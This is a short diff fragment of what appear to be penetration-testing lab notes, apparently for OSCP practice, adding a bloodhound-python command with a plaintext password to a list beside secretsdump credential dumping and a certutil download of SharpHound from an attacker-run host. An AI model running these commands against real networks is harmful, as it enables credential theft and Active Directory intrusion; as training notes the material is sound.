@@ -1283,6 +1283,7 @@ impacket-secretsdump oscp/emmet@10.10.1.202
 certutil -urlcache -split -f http://192.168.45.171/SharpHound.ps1
 Import-Module .\Sharphound.ps1
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp\
+bloodhound-python -d nagoya-industries.com -u 'Christopher.Lewis' -p 'Password@123' -ns 192.168.212.21 -c all
 ```
 
 ```jsx
